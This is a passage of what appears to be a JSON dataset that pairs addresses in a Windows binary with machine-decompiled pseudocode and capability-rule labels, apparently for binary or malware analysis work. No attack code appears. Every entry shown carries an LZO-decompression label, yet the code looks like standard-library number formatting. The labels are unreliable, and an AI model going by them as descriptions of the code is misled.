(*pcVar3)();\n    pcVar9 = stack0xffffffcc;\n    puVar18 = s;\n    ppcVar14 = puVar13 + -0xc;\n    puVar15 = puVar13 + -0xc;\n    if (stack0xffffffcc == NULL) {\n        if (*(var_40h + 0x10) != '\\0') goto code_r0x00457aff;\ncode_r0x00457a3e:\n        pcVar6 = *(arg_10h + 8);\n        if (pcVar6 <= pcVar9) goto code_r0x00457a4c;\n    }\n    else {\n        *(puVar13 + -4) = stack0xffffffcc;\n        *(puVar13 + -8) = 0x2e;\n        *(puVar13 + -0xc) = puVar18;\n        *(puVar13 + -0x10) = 0x457a17;\n        iVar11 = sub.msvcrt.dll_memchr();\n        cVar1 = *(var_40h + 0x10);\n        if (iVar11 == 0) {\n            if ((cVar1 != '\\0') &&\n               ((pcVar9 < 3 ||\n                (((*(s + 1) < ':' && (_var_50h = _var_50h & 0xffffffffffffff00 | *(s + 1),  *(s + 1) - 0x30 < 10)) &&\n                 ('/' < *(s + 1))))))) goto code_r0x00457aff;\n            goto code_r0x00457a3e;\n        }\n        puVar16[iVar11 - s] = *(var_40h + 0x24);\n        if (cVar1 == '\\0') goto code_r0x00457a3e;\ncode_r0x00457aff:\n        *(puVar13 + -0x10) = 0x457b11;\n        uVar20 = fcn.00418950();\n        iVar4 = var_40h;\n        iVar11 = -uVar20;\n        puVar8 = puVar13 + iVar11 + 0x1f & 0xfffffff0;\n        bVar19 = (*s - 0x2bU & 0xfd) == 0;\n        puVar18 = puVar8;\n        if (bVar19) {\n            uVar2 = *puVar16;\n            puVar16 = puVar16 + 1;\n            stack0xffffffcc = pcVar9 + -1;\n            *puVar8 = uVar2;\n            puVar18 = puVar8 + 1;\n        }\n        s = puVar8;\n        *(puVar13 + iVar11 + 0xc) = &fcn.004578e0::var_31h + 1;\n        *(puVar13 + iVar11 + 8) = puVar16;\n        *(puVar13 + iVar11 + 4) = puVar18;\n        *(puVar13 + iVar11) = uVar20 >> 0x20;\n        *(puVar13 + iVar11 + -4) = *(iVar4 + 0x26);\n        *(puVar13 + iVar11 + -8) = *(iVar4 + 0xc);\n        *(puVar13 + iVar11 + -0xc) = *(iVar4 + 8);\n        *(puVar13 + iVar11 + -0x10) = 0x457b7c;\n        fcn.00457810();\n        pcVar9 = stack0xffffffcc + bVar19;\n        puVar15 = puVar13 + iVar11 + -0x28;\n        ppcVar14 = puVar13 + iVar11 + -0x28;\n        stack0xffffffcc = pcVar9;\n        pcVar6 = *(arg_10h + 8);\n        puVar16 = s;\n        if (pcVar6 <= pcVar9) goto code_r0x00457a4c;\n    }\n    *(puVar15 + -4) = 0x457ba7;\n    iVar11 = fcn.00418950();\n    uVar10 = var_58h & 0xffff;\n    iVar11 = -iVar11;\n    ppcVar14 = puVar15 + iVar11;\n    *(puVar15 + iVar11 + 0x14) = pcVar9;\n    *(puVar15 + iVar11 + 0xc) = puVar16;\n    *(puVar15 + iVar11 + 8) = puVar15 + iVar11 + 0x2b & 0xfffffff0;\n    s = puVar15 + iVar11 + 0x2b & 0xfffffff0;\n    *(puVar15 + iVar11 + 0x10) = pcVar6;\n    *(puVar15 + iVar11) = arg_10h;\n    *(puVar15 + iVar11 + 4) = uVar10;\n    *(puVar15 + iVar11 + -4) = 0x457bd8;\n    fcn.0048c6b0();\n    stack0xffffffcc = pcVar6;\n    pcVar9 = pcVar6;\n    puVar16 = s;\ncode_r0x00457a4c:\n    uVar17 = var_48h;\n    *(arg_10h + 8) = 0;\n    if (var_48h == '\\0') {\n        iVar11 = *var_44h;\n        ppcVar14[1] = pcVar9;\n        *ppcVar14 = puVar16;\n        pcVar3 = *(iVar11 + 0x30);\n        ppcVar14[-1] = 0x457a6e;\n        pcVar6 = (*pcVar3)();\n        if (pcVar9 != pcVar6) {\n            uVar17 = 1;\n        }\n    }\n    return CONCAT44(uVar17, var_44h) & 0xffffffffff;\n}\n",
        "token_count": 3198
    },
    "00457cc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl fcn.00457cc0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    ushort *puVar7;\n    int32_t *extraout_ECX;\n    char *pcVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uchar *puVar12;\n    char **ppcVar13;\n    uchar *puVar14;\n    ushort *puVar15;\n    uint uVar16;\n    ushort *puVar17;\n    bool bVar18;\n    ulong uVar19;\n    unkbyte10 in_stack_00000018;\n    uint uStackY132;\n    int32_t iStackY128;\n    char *pcStack120;\n    int32_t iStack116;\n    uchar auStack112 [24];\n    char *var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t *var_44h;\n    int32_t var_40h;\n    ushort *s;\n    char *var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_44h = arg_8h;\n    var_48h = arg_ch;\n    var_50h = arg_14h;\n    iStackY128 = 0x457cf2;\n    var_40h = fcn.0042e500(arg_10h + 0x6c);\n    iVar10 = *(arg_10h + 4);\n    if (iVar10 < 0) {\n        iVar10 = 6;\n    }\n    pcStack120 = arg_18h;\n    iStackY128 = arg_10h;\n    uStackY132 = 0x457d23;\n    fcn.0046dfb0();\n    uStackY132 = 0x457d3b;\n    uVar19 = fcn.00418950();\n    iVar4 = -uVar19;\n    piVar11 = &stack0xffffff80 + iVar4;\n    s = &fcn.00457cc0::var_50h + iVar4 + 3 & 0xfffffff0;\n    if (uVar19 >> 0x20 == 0x104) {\n        *(&stack0xffffff7c + iVar4) = 0x457fca;\n        var_2ch = fcn.0048f260();\n        *(&stack0xffffff8c + iVar4) = &fcn.00457cc0::var_28h;\n        puVar15 = s;\n        *(&stack0xffffff88 + iVar4) = 0x36;\n        *(&stack0xffffff90 + iVar4) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar4) = puVar15;\n        *(&stack0xffffff80 + iVar4) = &fcn.00457cc0::var_2ch;\n        *(&stack0xffffff7c + iVar4) = 0x457ff2;\n        *NULL = fcn.0049df90();\n        if (0x35 < *NULL) {\n            var_54h = *NULL + 1;\n            *(&stack0xffffff7c + iVar4) = 0x458012;\n            iVar10 = fcn.00418950();\n            iVar10 = -iVar10;\n            piVar11 = &stack0xffffff80 + iVar10 + iVar4;\n            s = &fcn.00457cc0::var_50h + iVar10 + iVar4 + 3 & 0xfffffff0;\n            *(&stack0xffffff7c + iVar10 + iVar4) = 0x458023;\n            var_2ch = fcn.0048f260();\n            pcVar8 = var_54h;\n            *(&stack0xffffff8c + iVar10 + iVar4) = &fcn.00457cc0::var_28h;\n            puVar15 = s;\n            *(&stack0xffffff88 + iVar10 + iVar4) = pcVar8;\n            *(&stack0xffffff90 + iVar10 + iVar4) = in_stack_00000018;\n            *(&stack0xffffff84 + iVar10 + iVar4) = puVar15;\n            *(&stack0xffffff80 + iVar10 + iVar4) = &fcn.00457cc0::var_2ch;\n            *(&stack0xffffff7c + iVar10 + iVar4) = 0x458047;\n            *NULL = fcn.0049df90();\n        }\n    }\n    else {\n        *(&stack0xffffff7c + iVar4) = 0x457d58;\n        var_2ch = fcn.0048f260();\n        *(&stack0xffffff90 + iVar4) = iVar10;\n        puVar15 = s;\n        *(&stack0xffffff8c + iVar4) = &fcn.00457cc0::var_28h;\n        *(&stack0xffffff94 + iVar4) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar4) = puVar15;\n        *(&stack0xffffff88 + iVar4) = 0x36;\n        *(&stack0xffffff80 + iVar4) = &fcn.00457cc0::var_2ch;\n        *(&stack0xffffff7c + iVar4) = 0x457d84;\n        *NULL = fcn.0049df90();\n        piVar11 = &stack0xffffff80 + iVar4;\n        if (0x35 < *NULL) {\n            var_54h = *NULL + 1;\n            *(&stack0xffffff7c + iVar4) = 0x457e84;\n            iVar6 = fcn.00418950();\n            iVar6 = -iVar6;\n            piVar11 = &stack0xffffff80 + iVar6 + iVar4;\n            s = &fcn.00457cc0::var_50h + iVar6 + iVar4 + 3 & 0xfffffff0;\n            *(&stack0xffffff7c + iVar6 + iVar4) = 0x457e95;\n            var_2ch = fcn.0048f260();\n            pcVar8 = var_54h;\n            *(&stack0xffffff90 + iVar6 + iVar4) = iVar10;\n            puVar15 = s;\n            *(&stack0xffffff8c + iVar6 + iVar4) = &fcn.00457cc0::var_28h;\n            *(&stack0xffffff94 + iVar6 + iVar4) = in_stack_00000018;\n            *(&stack0xffffff84 + iVar6 + iVar4) = puVar15;\n            *(&stack0xffffff88 + iVar6 + iVar4) = pcVar8;\n            *(&stack0xffffff80 + iVar6 + iVar4) = &fcn.00457cc0::var_2ch;\n            *(&stack0xffffff7c + iVar6 + iVar4) = 0x457ec0;\n            *NULL = fcn.0049df90();\n        }\n    }\n    *piVar11 = arg_10h + 0x6c;\n    piVar11[-1] = 0x457d98;\n    fcn.004a0ae0();\n    piVar11[-1] = 0x457dac;\n    uVar19 = fcn.00418950();\n    iVar4 = -uVar19;\n    iVar10 = *extraout_ECX;\n    pcVar8 = (uVar19 >> 0x20) + s;\n    *(piVar11 + iVar4) = s;\n    puVar15 = piVar11 + iVar4 + 0x2f & 0xfffffff0;\n    *(piVar11 + iVar4 + 4) = pcVar8;\n    *(piVar11 + iVar4 + 8) = puVar15;\n    pcVar3 = *(iVar10 + 0x2c);\n    puVar12 = piVar11 + iVar4 + -4;\n    *(piVar11 + iVar4 + -4) = 0x457dcc;\n    (*pcVar3)();\n    pcVar8 = stack0xffffffcc;\n    puVar17 = s;\n    ppcVar13 = puVar12 + -0xc;\n    puVar14 = puVar12 + -0xc;\n    if (stack0xffffffcc == NULL) {\n        if (*(var_40h + 0x10) != '\\0') goto code_r0x00457edf;\ncode_r0x00457e18:\n        pcVar5 = *(arg_10h + 8);\n        if (pcVar5 <= pcVar8) goto code_r0x00457e26;\n    }\n    else {\n        *(puVar12 + -4) = stack0xffffffcc;\n        *(puVar12 + -8) = 0x2e;\n        *(puVar12 + -0xc) = puVar17;\n        *(puVar12 + -0x10) = 0x457df1;\n        iVar10 = sub.msvcrt.dll_memchr();\n        cVar1 = *(var_40h + 0x10);\n        if (iVar10 == 0) {\n            if ((cVar1 != '\\0') &&\n               ((pcVar8 < 3 ||\n                (((*(s + 1) < ':' && (var_54h = var_54h & 0xffffff00 | *(s + 1),  *(s + 1) - 0x30 < 10)) &&\n                 ('/' < *(s + 1))))))) goto code_r0x00457edf;\n            goto code_r0x00457e18;\n        }\n        puVar15[iVar10 - s] = *(var_40h + 0x24);\n        if (cVar1 == '\\0') goto code_r0x00457e18;\ncode_r0x00457edf:\n        *(puVar12 + -0x10) = 0x457ef1;\n        uVar19 = fcn.00418950();\n        iVar4 = var_40h;\n        iVar10 = -uVar19;\n        puVar7 = puVar12 + iVar10 + 0x23 & 0xfffffff0;\n        bVar18 = (*s - 0x2bU & 0xfd) == 0;\n        puVar17 = puVar7;\n        if (bVar18) {\n            uVar2 = *puVar15;\n            puVar15 = puVar15 + 1;\n            stack0xffffffcc = pcVar8 + -1;\n            *puVar7 = uVar2;\n            puVar17 = puVar7 + 1;\n        }\n        s = puVar7;\n        *(puVar12 + iVar10 + 0xc) = &fcn.00457cc0::var_31h + 1;\n        *(puVar12 + iVar10 + 8) = puVar15;\n        *(puVar12 + iVar10 + 4) = puVar17;\n        *(puVar12 + iVar10) = uVar19 >> 0x20;\n        *(puVar12 + iVar10 + -4) = *(iVar4 + 0x26);\n        *(puVar12 + iVar10 + -8) = *(iVar4 + 0xc);\n        *(puVar12 + iVar10 + -0xc) = *(iVar4 + 8);\n        *(puVar12 + iVar10 + -0x10) = 0x457f5c;\n        fcn.00457810();\n        pcVar8 = stack0xffffffcc + bVar18;\n        puVar14 = puVar12 + iVar10 + -0x28;\n        ppcVar13 = puVar12 + iVar10 + -0x28;\n        stack0xffffffcc = pcVar8;\n        pcVar5 = *(arg_10h + 8);\n        puVar15 = s;\n        if (pcVar5 <= pcVar8) goto code_r0x00457e26;\n    }\n    *(puVar14 + -4) = 0x457f87;\n    iVar10 = fcn.00418950();\n    uVar9 = var_50h & 0xffff;\n    iVar10 = -iVar10;\n    ppcVar13 = puVar14 + iVar10;\n    *(puVar14 + iVar10 + 0x14) = pcVar8;\n    *(puVar14 + iVar10 + 0xc) = puVar15;\n    *(puVar14 + iVar10 + 8) = puVar14 + iVar10 + 0x2f & 0xfffffff0;\n    s = puVar14 + iVar10 + 0x2f & 0xfffffff0;\n    *(puVar14 + iVar10 + 0x10) = pcVar5;\n    *(puVar14 + iVar10) = arg_10h;\n    *(puVar14 + iVar10 + 4) = uVar9;\n    *(puVar14 + iVar10 + -4) = 0x457fb8;\n    fcn.0048c6b0();\n    stack0xffffffcc = pcVar5;\n    pcVar8 = pcVar5;\n    puVar15 = s;\ncode_r0x00457e26:\n    uVar16 = var_48h;\n    *(arg_10h + 8) = 0;\n    if (var_48h == '\\0') {\n        iVar10 = *var_44h;\n        ppcVar13[1] = pcVar8;\n        *ppcVar13 = puVar15;\n        pcVar3 = *(iVar10 + 0x30);\n        ppcVar13[-1] = 0x457e48;\n        pcVar5 = (*pcVar3)();\n        if (pcVar8 != pcVar5) {\n            uVar16 = 1;\n        }\n    }\n    return CONCAT44(uVar16, var_44h) & 0xffffffffff;\n}\n",
        "token_count": 3132
    },
    "00458270": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00458270(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint64_t uVar10;\n    ulong uVar11;\n    uint16_t *apuStackY148 [2];\n    uchar auStack109 [9];\n    uint16_t *var_60h;\n    int32_t var_5ch;\n    uint32_t var_58h;\n    uint32_t var_52h;\n    uint32_t var_4ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_ch;\n    \n    unique0x00007a00 = *(arg_10h + 0xc);\n    var_52h._0_2_ = arg_14h;\n    if ((unique0x00007a00 & 1) == 0) {\n        apuStackY148[1] = 0x4582b8;\n        uVar10 = fcn.00456f20(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff);\n        return uVar10 & 0xffffffff | (arg_ch & 0xffffff00 | uVar10 >> 0x20 & 0xff) << 0x20;\n    }\n    var_58h = arg_18h;\n    var_4ch = var_4ch & 0xffffff00 | arg_ch & 0xff;\n    apuStackY148[1] = 0x4582f7;\n    iVar3 = fcn.0042e500(arg_10h + 0x6c);\n    if (var_58h == '\\0') {\n        var_58h = *(iVar3 + 0x1c);\n        uVar6 = *(iVar3 + 0x20);\n        iVar3 = *(arg_10h + 8);\n        if (uVar6 < iVar3) goto code_r0x0045831c;\ncode_r0x004583ac:\n        *(arg_10h + 8) = 0;\n        if (var_4ch != '\\0') goto code_r0x004583dc;\ncode_r0x004583bc:\n        apuStackY148[1] = var_58h;\n        apuStackY148[0] = 0x4583d0;\n        var_4ch = uVar6;\n        uVar6 = (**(*arg_8h + 0x30))();\n        var_4ch = var_4ch != uVar6;\n    }\n    else {\n        var_58h = *(iVar3 + 0x14);\n        uVar6 = *(iVar3 + 0x18);\n        iVar3 = *(arg_10h + 8);\n        if (iVar3 <= uVar6) goto code_r0x004583ac;\ncode_r0x0045831c:\n        var_5ch = iVar3 - uVar6;\n        apuStackY148[0] = 0x458332;\n        uVar11 = fcn.00418950();\n        uVar2 = var_58h;\n        iVar7 = var_5ch;\n        uVar6 = uVar11 >> 0x20;\n        iVar3 = -uVar11;\n        puVar4 = &stack0xffffff93 + iVar3 & 0xfffffff0;\n        var_60h = puVar4;\n        puVar5 = puVar4;\n        iVar8 = extraout_ECX;\n        do {\n            *puVar5 = var_52h;\n            puVar5 = puVar5 + 1;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n        *(arg_10h + 8) = 0;\n        if ((stack0xffffffac & 0xb0) == 0x20) {\n            if (var_4ch != '\\0') goto code_r0x004583dc;\n            iVar7 = *arg_8h;\n            *(&stack0xffffff74 + iVar3) = uVar6;\n            var_4ch = uVar6;\n            *(&stack0xffffff70 + iVar3) = uVar2;\n            pcVar1 = *(iVar7 + 0x30);\n            puVar9 = &stack0xffffff6c + iVar3;\n            *(&stack0xffffff6c + iVar3) = 0x45840b;\n            uVar6 = (*pcVar1)();\n            iVar3 = var_5ch;\n            puVar5 = var_60h;\n            if (var_4ch == uVar6) {\n                iVar7 = *arg_8h;\n                *(puVar9 + -4) = var_5ch;\n                *(puVar9 + -8) = puVar5;\n                pcVar1 = *(iVar7 + 0x30);\n                *(puVar9 + -0xc) = 0x45842d;\n                iVar7 = (*pcVar1)();\n                var_4ch = iVar3 != iVar7;\n                goto code_r0x004583dc;\n            }\n        }\n        else {\n            if (var_4ch != '\\0') goto code_r0x004583dc;\n            iVar8 = *arg_8h;\n            unique0x1000019c = uVar6;\n            *(&stack0xffffff74 + iVar3) = var_5ch;\n            *(&stack0xffffff70 + iVar3) = puVar4;\n            iVar3 = (**(iVar8 + 0x30))();\n            uVar6 = stack0xffffffac;\n            if (iVar7 == iVar3) goto code_r0x004583bc;\n        }\n        var_4ch = 1;\n    }\ncode_r0x004583dc:\n    return CONCAT44(arg_ch & 0xffffff00 | var_4ch & 0xff, arg_8h);\n}\n",
        "token_count": 1421
    },
    "00459400": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00459400(int32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint noname_3, int32_t *arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    uint *puVar12;\n    int32_t *piVar13;\n    int32_t iVar15;\n    int32_t *piVar16;\n    uint uStack68;\n    int32_t aiStack64 [5];\n    uchar uStack41;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    int32_t *piVar14;\n    \n    aiStack64[1] = arg_24h + 0x6c;\n    aiStack64[0] = 0x459417;\n    var_1ch = fcn.004a0a80();\n    aiStack64[0] = 0x45942e;\n    iVar4 = fcn.00418950();\n    iVar4 = -iVar4;\n    *(&stack0xffffffc4 + iVar4) = &fcn.00459400::arg_10h;\n    *(&stack0xffffffc0 + iVar4) = 0x459445;\n    cVar2 = fcn.00430ce0();\n    if (cVar2 == '\\0') {\n        *(&stack0xffffffbc + iVar4) = 0x45946d;\n        cVar2 = fcn.00430dd0();\n        if (arg_20h != 0) {\n            iVar15 = 0;\n            var_20h = &stack0xffffffd7 + iVar4 & 0xfffffff0;\n            piVar16 = NULL;\n            iVar7 = arg_1ch;\n            piVar11 = &stack0xffffffc0 + iVar4;\n            do {\n                while (cVar3 = **(iVar7 + iVar15 * 4),  cVar3 == cVar2) {\ncode_r0x004594bc:\n                    var_20h[piVar16] = iVar15;\n                    piVar16 = piVar16 + 1;\n                    iVar15 = iVar15 + 1;\n                    piVar13 = piVar11;\n                    if (arg_20h == iVar15) goto code_r0x004594cd;\n                }\n                iVar4 = *var_1ch;\n                *piVar11 = cVar3;\n                pcVar1 = *(iVar4 + 8);\n                piVar10 = piVar11 + -1;\n                piVar11[-1] = 0x4594a0;\n                arg_1ch = iVar7;\n                cVar3 = (*pcVar1)();\n                piVar11 = piVar10 + -4;\n                piVar13 = piVar10 + -4;\n                iVar7 = arg_1ch;\n                if (cVar2 == cVar3) goto code_r0x004594bc;\n                iVar15 = iVar15 + 1;\n                piVar11 = piVar10 + -4;\n            } while (arg_20h != iVar15);\ncode_r0x004594cd:\n            piVar11 = var_20h;\n            var_20h = NULL;\njoined_r0x004594de:\n            if (0x1 < piVar16) {\n                *piVar13 = *(arg_1ch + *piVar11 * 4);\n                piVar13[-1] = 0x4594f6;\n                uVar5 = sub.msvcrt.dll_strlen();\n                var_1ch = piVar16;\n                piVar9 = 0x1;\n                do {\n                    *piVar13 = *(arg_1ch + piVar11[piVar9] * 4);\n                    piVar13[-1] = 0x459513;\n                    uVar6 = sub.msvcrt.dll_strlen();\n                    piVar16 = var_1ch;\n                    if (uVar6 < uVar5) {\n                        uVar5 = uVar6;\n                    }\n                    piVar9 = piVar9 + 1;\n                } while (piVar9 < var_1ch);\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    pcVar1 = *(*arg_8h + 0x28);\n                    piVar14 = piVar13 + -1;\n                    piVar13 = piVar13 + -1;\n                    *piVar14 = 0x459695;\n                    (*pcVar1)();\n                }\n                var_20h = var_20h + 1;\n                arg_ch = 0xffffffff;\n                if (uVar5 <= var_20h) goto code_r0x0045944c;\n                *piVar13 = &fcn.00459400::arg_10h;\n                piVar13[-1] = 0x459560;\n                cVar2 = fcn.00430ce0();\n                piVar13 = piVar13 + -1;\n                if (cVar2 != '\\0') goto code_r0x0045944c;\n                piVar9 = NULL;\n                do {\n                    while( true ) {\n                        piVar8 = piVar11 + piVar9;\n                        var_1ch = var_1ch & 0xffffff00 | *(*(arg_1ch + *piVar8 * 4) + var_20h);\n                        uVar5 = arg_ch;\n                        if (arg_8h != NULL) {\n                            if (arg_8h[2] < arg_8h[3]) {\n                                uVar5 = *arg_8h[2];\n                            }\n                            else {\n                                var_24h = piVar8;\n                                pcVar1 = *(*arg_8h + 0x24);\n                                puVar12 = piVar13 + -4;\n                                piVar13 = piVar13 + -4;\n                                *puVar12 = 0x45966c;\n                                uVar5 = (*pcVar1)();\n                                piVar8 = var_24h;\n                                if (uVar5 == 0xffffffff) {\n                                    arg_8h = NULL;\n                                    uVar5 = 0xffffffff;\n                                }\n                            }\n                        }\n                        if (var_1ch != uVar5) break;\n                        piVar9 = piVar9 + 1;\n                        if (piVar16 <= piVar9) goto joined_r0x004594de;\n                    }\n                    piVar16 = piVar16 + -1;\n                    *piVar8 = piVar11[piVar16];\n                } while (piVar9 < piVar16);\n                goto joined_r0x004594de;\n            }\n            if (piVar16 == 0x1) {\n                piVar13[-1] = 0x4595cd;\n                fcn.00485e80();\n                uVar5 = var_20h;\n                arg_ch = 0xffffffff;\n                iVar4 = *(arg_1ch + *piVar11 * 4);\n                var_20h = *piVar11;\n                uVar5 = uVar5 + 1;\n                *piVar13 = iVar4;\n                piVar13[-1] = 0x4595ed;\n                var_1ch = sub.msvcrt.dll_strlen();\n                if (uVar5 < var_1ch) {\n                    do {\n                        arg_ch = 0xffffffff;\n                        *piVar13 = &fcn.00459400::arg_10h;\n                        piVar13[-1] = 0x45960e;\n                        cVar2 = fcn.00430ce0();\n                        if (cVar2 != '\\0') goto code_r0x0045944c;\n                        cVar2 = *(iVar4 + uVar5);\n                        piVar13[-2] = 0x459628;\n                        cVar3 = fcn.00430dd0();\n                        if (cVar2 != cVar3) goto code_r0x0045944c;\n                        uVar5 = uVar5 + 1;\n                        piVar13[-2] = 0x45963b;\n                        fcn.00485e80();\n                        piVar13 = piVar13 + -1;\n                    } while (uVar5 != var_1ch);\n                }\n                else if (uVar5 != var_1ch) goto code_r0x0045944c;\n                arg_ch = 0xffffffff;\n                *arg_18h = var_20h;\n                goto code_r0x00459452;\n            }\n        }\n    }\ncode_r0x0045944c:\n    *arg_28h = *arg_28h | 4;\ncode_r0x00459452:\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 2068
    },
    "0045a910": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0045a910(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t **arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    bool bVar11;\n    uint *puVar12;\n    uchar *puVar13;\n    uint *puVar15;\n    int32_t *piVar16;\n    uchar *puVar17;\n    uint *puVar18;\n    int32_t **ppiVar19;\n    int32_t **ppiVar20;\n    ulong uVar21;\n    uint uStack84;\n    int32_t aiStack80 [5];\n    uchar uStack57;\n    int32_t **var_34h;\n    int32_t **var_2dh;\n    int32_t **var_28h;\n    int32_t **var_24h;\n    int32_t **var_20h;\n    int32_t **var_1ch;\n    uint var_ch;\n    uint *puVar14;\n    \n    aiStack80[1] = arg_24h + 0x6c;\n    aiStack80[0] = 0x45a927;\n    var_24h = fcn.004a0a80();\n    aiStack80[0] = 0x45a93f;\n    iVar6 = fcn.00418950();\n    iVar6 = -iVar6;\n    var_28h = &stack0xffffffc7 + iVar6 & 0xfffffff0;\n    *(&stack0xffffffb4 + iVar6) = &fcn.0045a910::arg_10h;\n    *(&stack0xffffffb0 + iVar6) = 0x45a959;\n    cVar4 = fcn.00430ce0();\n    puVar13 = &stack0xffffffb0 + iVar6;\n    if (cVar4 == '\\0') {\n        ppiVar20 = NULL;\n        ppiVar10 = NULL;\n        *(&stack0xffffffac + iVar6) = 0x45ab84;\n        uVar5 = fcn.00430dd0();\n        iVar3 = arg_1ch;\n        var_1ch = var_1ch & 0xffffff00 | uVar5;\n        ppiVar19 = arg_20h * 2;\n        if (ppiVar19 == NULL) {\n            var_34h = NULL;\n            ppiVar20 = ppiVar19;\n        }\n        else {\n            var_20h = ppiVar19;\n            piVar8 = &stack0xffffffb0 + iVar6;\n            do {\n                while( true ) {\n                    cVar4 = **(iVar3 + ppiVar20 * 4);\n                    if (cVar4 != var_1ch) break;\ncode_r0x0045abc8:\n                    var_28h[ppiVar10] = ppiVar20;\n                    ppiVar10 = ppiVar10 + 1;\n                    ppiVar20 = ppiVar20 + 1;\n                    puVar17 = piVar8;\n                    if (ppiVar20 == var_20h) goto code_r0x0045abd9;\n                }\n                piVar2 = *var_24h;\n                *piVar8 = cVar4;\n                pcVar1 = piVar2[2];\n                piVar16 = piVar8 + -1;\n                piVar8[-1] = 0x45abad;\n                cVar4 = (*pcVar1)();\n                piVar8 = piVar16 + -4;\n                puVar17 = piVar16 + -4;\n                if (var_1ch == cVar4) goto code_r0x0045abc8;\n                ppiVar20 = ppiVar20 + 1;\n                piVar8 = piVar16 + -4;\n            } while (ppiVar20 != var_20h);\ncode_r0x0045abd9:\n            if (ppiVar10 == NULL) {\n                var_34h = NULL;\n                puVar13 = puVar17;\n                ppiVar19 = ppiVar10;\n                ppiVar20 = NULL;\n            }\n            else {\n                *(puVar17 + -4) = 0x45ac14;\n                fcn.00485e80();\n                arg_ch = 0xffffffff;\n                *(puVar17 + -4) = 0x45ac30;\n                uVar21 = fcn.00418950();\n                iVar3 = arg_1ch;\n                iVar6 = -uVar21;\n                puVar13 = puVar17 + iVar6;\n                var_20h = ppiVar10;\n                var_1ch = (uVar21 >> 0x20) + var_28h;\n                var_34h = puVar17 + iVar6 + 0x13 & 0xfffffff0;\n                ppiVar19 = var_28h;\n                ppiVar20 = puVar17 + iVar6 + 0x13 & 0xfffffff0;\n                do {\n                    piVar8 = *ppiVar19;\n                    ppiVar19 = ppiVar19 + 1;\n                    *(puVar17 + iVar6) = *(iVar3 + piVar8 * 4);\n                    *(puVar17 + iVar6 + -4) = 0x45ac63;\n                    piVar8 = sub.msvcrt.dll_strlen();\n                    *ppiVar20 = piVar8;\n                    ppiVar20 = ppiVar20 + 1;\n                } while (ppiVar19 != var_1ch);\n                ppiVar19 = var_20h;\n                ppiVar20 = 0x1;\n            }\n        }\n    }\n    else {\n        var_34h = NULL;\n        puVar13 = &stack0xffffffb0 + iVar6;\n        ppiVar19 = NULL;\n        ppiVar20 = NULL;\n    }\n    var_20h._0_1_ = arg_ch == 0xffffffff;\n    bVar11 = arg_8h != NULL && var_20h;\n    if (bVar11) goto code_r0x0045aa7d;\n    while( true ) {\n        var_1ch._0_1_ = arg_14h == -1;\n        bVar11 = arg_10h != NULL && var_1ch;\n        var_1ch = var_1ch & 0xffffff00 | bVar11;\n        if ((bVar11) && (var_1ch._0_1_ = 0,  arg_10h[3] <= arg_10h[2])) {\n            var_20h = var_20h & 0xffffff00 | var_20h;\n            pcVar1 = *(*arg_10h + 0x24);\n            puVar14 = puVar13 + -4;\n            puVar13 = puVar13 + -4;\n            *puVar14 = 0x45aad6;\n            iVar6 = (*pcVar1)();\n            if (iVar6 == -1) {\n                arg_10h = NULL;\n            }\n        }\n        if (var_20h == var_1ch) break;\n        uVar7 = arg_ch;\n        if ((arg_ch 